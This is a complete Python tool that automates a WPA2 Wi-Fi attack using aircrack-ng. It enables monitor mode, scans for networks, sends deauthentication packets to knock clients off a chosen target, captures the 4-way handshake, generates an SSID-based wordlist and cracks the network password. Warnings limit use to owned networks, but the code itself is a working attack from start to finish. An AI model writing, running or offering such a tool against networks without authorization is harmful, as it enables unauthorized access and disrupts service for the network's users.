#!/usr/bin/env python3
"""
🤝 REAL WPA2 4-WAY HANDSHAKE ATTACK
===================================
Actual WiFi handshake capture and password cracking tool.
Uses real aircrack-ng suite for legitimate attacks.

⚠️  LEGAL WARNING:
- ONLY use on networks you own or have explicit permission
- Unauthorized WiFi access is a serious crime
- This tool performs REAL attacks, not simulations
"""

import subprocess
import os
import sys
import time
import signal
import threading
from pathlib import Path
import hashlib
import hmac
import binascii

class RealHandshakeAttack:
    def __init__(self):
        self.interface = None
        self.monitor_interface = None
        self.target_ssid = None
        self.target_bssid = None
        self.handshake_file = None
        self.capture_process = None
        self.deauth_process = None
        self.running = False
        
    def check_root_privileges(self):
        """Check if running as root (required for monitor mode)"""
        if os.geteuid() != 0:
            print("❌ This tool requires root privileges for monitor mode")
            print("💡 Run with: sudo python3 real_handshake_attack.py")
            return False
        return True
    
    def check_requirements(self):
        """Check if real aircrack-ng tools are available"""
        required_tools = ['airmon-ng', 'airodump-ng', 'aireplay-ng', 'aircrack-ng']
        available_tools = []
        
        print("🔍 Checking aircrack-ng suite...")
        
        for tool in required_tools:
            try:
                result = subprocess.run([tool, '--help'], 
                                      capture_output=True, timeout=5)
                available_tools.append(tool)
                print(f"✅ {tool} found")
            except (subprocess.TimeoutExpired, FileNotFoundError):
                print(f"❌ {tool} not found")
        
        if len(available_tools) == len(required_tools):
            print("✅ All aircrack-ng tools available")
            return True
        elif 'aircrack-ng' in available_tools:
            print("⚠️  Some tools missing, but aircrack-ng available")
            print("   Can analyze existing handshake files")
            return 'partial'
        else:
            print("❌ aircrack-ng suite not properly installed")
            print("📦 Install with: brew install aircrack-ng")
            return False
    
    def get_wireless_interfaces(self):
        """Get available wireless interfaces"""
        try:
            # Try airmon-ng to list interfaces
            result = subprocess.run(['airmon-ng'], capture_output=True, text=True)
            interfaces = []
            
            for line in result.stdout.split('\n'):
                if 'phy' in line and 'wlan' in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        interfaces.append(parts[1])
            
            if not interfaces:
                # Fallback to system interfaces
                interfaces = ['en0', 'en1']  # Common macOS interfaces
            
            return interfaces
            
        except Exception as e:
            print(f"⚠️  Could not detect interfaces: {e}")
            return ['en0']
    
    def enable_monitor_mode(self, interface):
        """Enable monitor mode on wireless interface"""
        print(f"🔄 Enabling monitor mode on {interface}...")
        
        try:
            # Kill processes that might interfere
            subprocess.run(['airmon-ng', 'check', 'kill'], 
                          capture_output=True, timeout=10)
            
            # Enable monitor mode
            result = subprocess.run(['airmon-ng', 'start', interface], 
                                  capture_output=True, text=True, timeout=10)
            
            # Parse output to find monitor interface name
            for line in result.stdout.split('\n'):
                if 'monitor mode enabled' in line.lower():
                    # Extract monitor interface name (usually interface + 'mon')
                    parts = line.split()
                    for part in parts:
                        if 'mon' in part or interface in part:
                            monitor_if = part.strip('()')
                            if monitor_if != interface:
                                print(f"✅ Monitor mode enabled: {monitor_if}")
                                return monitor_if
            
            # If airmon-ng not available, return original interface
            print(f"⚠️  Monitor mode may not be available, using {interface}")
            return interface
            
        except Exception as e:
            print(f"❌ Failed to enable monitor mode: {e}")
            return None
    
    def scan_networks(self, interface):
        """Scan for WiFi networks using airodump-ng"""
        print("🔍 Scanning for WiFi networks...")
        
        try:
            # Use airodump-ng for scanning
            cmd = ['airodump-ng', '--write-interval', '1', '--output-format', 'csv', 
                   '--write', '/tmp/scan', interface]
            
            print("📡 Starting network scan (press Ctrl+C to stop)...")
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                     stderr=subprocess.PIPE, text=True)
            
            # Let it run for 10 seconds
            time.sleep(10)
            process.terminate()
            
            # Parse CSV output
            networks = self.parse_airodump_csv('/tmp/scan-01.csv')
            return networks
            
        except FileNotFoundError:
            print("⚠️  airodump-ng not available, using alternative scan...")
            return self.alternative_scan()
        except Exception as e:
            print(f"❌ Scan failed: {e}")
            return []
    
    def parse_airodump_csv(self, csv_file):
        """Parse airodump-ng CSV output"""
        networks = []
        try:
            with open(csv_file, 'r') as f:
                lines = f.readlines()
            
            # Find the start of AP data
            ap_start = 0
            for i, line in enumerate(lines):
                if 'BSSID' in line and 'ESSID' in line:
                    ap_start = i + 1
                    break
            
            # Parse AP data
            for line in lines[ap_start:]:
                if line.strip() and ',' in line:
                    parts = line.split(',')
                    if len(parts) >= 14:
                        bssid = parts[0].strip()
                        channel = parts[3].strip()
                        privacy = parts[5].strip()
                        essid = parts[13].strip()
                        
                        if essid and essid != ' ':
                            networks.append({
                                'ssid': essid,
                                'bssid': bssid,
                                'channel': channel,
                                'security': privacy
                            })
            
            # Clean up
            os.remove(csv_file)
            return networks
            
        except Exception as e:
            print(f"⚠️  Could not parse scan results: {e}")
            return []
    
    def alternative_scan(self):
        """Alternative scanning method using airport utility"""
        try:
            airport_path = '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport'
            
            if os.path.exists(airport_path):
                result = subprocess.run([airport_path, '-s'], 
                                      capture_output=True, text=True, timeout=10)
                networks = []
                
                for line in result.stdout.split('\n')[1:]:
                    if line.strip():
                        parts = line.split()
                        if len(parts) >= 6:
                            ssid = parts[0]
                            bssid = parts[1]
                            channel = parts[4] if len(parts) > 4 else 'Unknown'
                            security = ' '.join(parts[6:]) if len(parts) > 6 else 'NONE'
                            
                            networks.append({
                                'ssid': ssid,
                                'bssid': bssid,
                                'channel': channel,
                                'security': security
                            })
                
                return networks
        except Exception as e:
            print(f"❌ Alternative scan failed: {e}")
        
        return []
    
    def capture_handshake(self, target_network, interface, duration=60):
        """Capture 4-way handshake for target network"""
        self.target_ssid = target_network['ssid']
        self.target_bssid = target_network['bssid']
        self.handshake_file = f"handshake_{self.target_ssid}_{int(time.time())}"
        
        print(f"🎯 Target: {self.target_ssid} ({self.target_bssid})")
        print(f"📂 Output file: {self.handshake_file}")
        print(f"⏱️  Capture duration: {duration} seconds")
        
        try:
            # Start airodump-ng to capture handshake
            cmd = [
                'airodump-ng',
                '--bssid', self.target_bssid,
                '--channel', target_network['channel'],
                '--write', self.handshake_file,
                interface
            ]
            
            print("🔍 Starting handshake capture...")
            self.capture_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                                   stderr=subprocess.PIPE)
            
            # Wait a bit for capture to start
            time.sleep(5)
            
            # Start deauth attack to force handshake
            self.start_deauth_attack(target_network, interface)
            
            # Capture for specified duration
            print(f"⏳ Capturing for {duration} seconds...")
            time.sleep(duration)
            
            # Stop capture
            self.stop_capture()
            
            # Check if handshake was captured
            return self.verify_handshake_capture()
            
        except Exception as e:
            print(f"❌ Handshake capture failed: {e}")
            return False
    
    def start_deauth_attack(self, target_network, interface):
        """Send deauth packets to force handshake"""
        print("💥 Starting deauth attack to force handshake...")
        
        try:
            # Send deauth packets
            cmd = [
                'aireplay-ng',
                '--deauth', '5',  # Send 5 deauth packets
                '-a', self.target_bssid,
                interface
            ]
            
            self.deauth_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                                  stderr=subprocess.PIPE)
            
            print("✅ Deauth attack started")
            
        except Exception as e:
            print(f"⚠️  Deauth attack failed: {e}")
    
    def stop_capture(self):
        """Stop all capture processes"""
        if self.capture_process:
            self.capture_process.terminate()
            self.capture_process = None
        
        if self.deauth_process:
            self.deauth_process.terminate()
            self.deauth_process = None
        
        print("🛑 Capture stopped")
    
    def verify_handshake_capture(self):
        """Verify if valid handshake was captured"""
        cap_file = f"{self.handshake_file}-01.cap"
        
        if not os.path.exists(cap_file):
            print("❌ No capture file found")
            return False
        
        try:
            # Use aircrack-ng to check for handshake
            result = subprocess.run([
                'aircrack-ng',
                '-l', '/dev/null',  # Don't output found passwords
                cap_file
            ], capture_output=True, text=True, timeout=30)
            
            if 'handshake' in result.stdout.lower():
                print("✅ Valid handshake captured!")
                return True
            else:
                print("❌ No valid handshake found in capture")
                return False
                
        except Exception as e:
            print(f"⚠️  Could not verify handshake: {e}")
            return False
    
    def crack_handshake(self, wordlist_file=None):
        """Crack captured handshake using wordlist"""
        if not self.handshake_file:
            print("❌ No handshake file available")
            return False
        
        cap_file = f"{self.handshake_file}-01.cap"
        
        if not os.path.exists(cap_file):
            print("❌ Handshake file not found")
            return False
        
        # Generate wordlist if none provided
        if not wordlist_file:
            wordlist_file = self.generate_targeted_wordlist()
        
        print(f"🔑 Starting password crack attack...")
        print(f"📂 Handshake file: {cap_file}")
        print(f"📝 Wordlist: {wordlist_file}")
        
        try:
            # Use aircrack-ng to crack the password
            cmd = [
                'aircrack-ng',
                '-a2',  # WPA2-PSK
                '-b', self.target_bssid,
                '-w', wordlist_file,
                cap_file
            ]
            
            print("🚀 Starting aircrack-ng password attack...")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            # Parse output for found password
            for line in result.stdout.split('\n'):
                if 'KEY FOUND' in line:
                    # Extract password from output
                    password = line.split('[')[1].split(']')[0].strip()
                    print(f"\n🎉 PASSWORD CRACKED!")
                    print(f"🔑 Password: {password}")
                    print(f"🎯 Network: {self.target_ssid}")
                    return password
            
            print("❌ Password not found in wordlist")
            print("💡 Try a larger wordlist or brute force attack")
            return None
            
        except subprocess.TimeoutExpired:
            print("⏰ Attack timed out")
            return None
        except Exception as e:
            print(f"❌ Crack attack failed: {e}")
            return None
    
    def generate_targeted_wordlist(self, size=10000):
        """Generate targeted wordlist for the specific SSID"""
        wordlist_file = f"wordlist_{self.target_ssid}_{int(time.time())}.txt"
        
        print(f"📝 Generating targeted wordlist: {wordlist_file}")
        
        passwords = []
        ssid = self.target_ssid.lower()
        
        # SSID-based passwords (highest success rate)
        ssid_variants = [
            self.target_ssid, ssid, self.target_ssid.upper(),
            f"{ssid}123", f"{ssid}1234", f"{ssid}12345",
            f"{ssid}2025", f"{ssid}2024", f"{ssid}01",
            f"wifi{ssid}", f"{ssid}wifi", f"{ssid}password",
            f"password{ssid}", f"{ssid}admin", f"admin{ssid}",
        ]
        passwords.extend(ssid_variants)
        
        # Common WiFi passwords
        common_wifi = [
            "password", "12345678", "123456789", "1234567890",
            "qwerty123", "password123", "admin123", "welcome123",
            "internet", "wireless", "network", "router", "wifi123",
            "letmein", "welcome", "admin", "guest", "user", "test",
        ]
        passwords.extend(common_wifi)
        
        # Numeric patterns
        for i in range(10000000, 100000000, 1111111):
            passwords.append(str(i))
        
        # Date patterns
        for year in range(2020, 2026):
            passwords.extend([
                str(year), f"password{year}", f"wifi{year}",
                f"{year}password", f"{year}wifi"
            ])
        
        # Keyboard patterns
        keyboard_patterns = [
            "qwertyui", "asdfghjk", "zxcvbnm", "qwerty123",
            "1qaz2wsx", "qazwsxedc", "1234qwer", "qwer1234"
        ]
        passwords.extend(keyboard_patterns)
        
        # Remove duplicates and limit size
        unique_passwords = list(dict.fromkeys(passwords))
        final_passwords = unique_passwords[:size]
        
        # Write to file
        with open(wordlist_file, 'w') as f:
            for password in final_passwords:
                f.write(password + '\n')
        
        print(f"✅ Generated {len(final_passwords)} passwords")
        return wordlist_file
    
    def run_full_attack(self):
        """Run complete handshake capture and crack attack"""
        print("🤝 REAL WPA2 4-WAY HANDSHAKE ATTACK")
        print("=" * 40)
        print("⚠️  WARNING: This performs REAL WiFi attacks!")
        print("⚠️  ONLY use on networks you own!")
        print()
        
        # Check requirements
        if not self.check_root_privileges():
            return
        
        tools_status = self.check_requirements()
        if not tools_status:
            return
        
        # Get wireless interface
        interfaces = self.get_wireless_interfaces()
        if not interfaces:
            print("❌ No wireless interfaces found")
            return
        
        print(f"🔌 Available interfaces: {', '.join(interfaces)}")
        self.interface = interfaces[0]
        
        # Enable monitor mode (if available)
        if tools_status == True:  # Full tools available
            self.monitor_interface = self.enable_monitor_mode(self.interface)
            if not self.monitor_interface:
                print("❌ Could not enable monitor mode")
                return
        else:
            self.monitor_interface = self.interface
        
        # Scan for networks
        networks = self.scan_networks(self.monitor_interface)
        if not networks:
            print("❌ No networks found")
            return
        
        print(f"\n📡 Found {len(networks)} networks:")
        for i, network in enumerate(networks[:10], 1):
            print(f"   {i}. {network['ssid']} ({network['bssid']}) - {network['security']}")
        
        # Select target network
        try:
            choice = input("\n🎯 Select target network (number): ").strip()
            idx = int(choice) - 1
            
            if 0 <= idx < len(networks):
                target_network = networks[idx]
            else:
                print("❌ Invalid selection")
                return
        except ValueError:
            print("❌ Invalid input")
            return
        
        # Confirm attack
        print(f"\n⚠️  TARGET: {target_network['ssid']} ({target_network['bssid']})")
        confirm = input("⚠️  This will perform a REAL attack. Continue? (yes/no): ")
        if confirm.lower() not in ['yes', 'y']:
            print("❌ Attack cancelled")
            return
        
        # Capture handshake
        print("\n" + "="*50)
        print("PHASE 1: HANDSHAKE CAPTURE")
        print("="*50)
        
        success = self.capture_handshake(target_network, self.monitor_interface)
        if not success:
            print("❌ Failed to capture handshake")
            return
        
        # Crack password
        print("\n" + "="*50)
        print("PHASE 2: PASSWORD CRACKING")
        print("="*50)
        
        password = self.crack_handshake()
        if password:
            print(f"\n🎉 ATTACK SUCCESSFUL!")
            print(f"🔑 WiFi Password: {password}")
        else:
            print(f"\n❌ Attack failed - password not in wordlist")
            print(f"💡 Handshake captured in: {self.handshake_file}-01.cap")
            print(f"💡 Try with a larger wordlist using aircrack-ng")

def main():
    """Main function"""
    try:
        attack = RealHandshakeAttack()
        attack.run_full_attack()
    except KeyboardInterrupt:
        print("\n🛑 Attack interrupted by user")
        if hasattr(attack, 'stop_capture'):
            attack.stop_capture()
    except Exception as e:
        print(f"\n❌ Unexpected error: {e}")

if __name__ == "__main__":
    main()
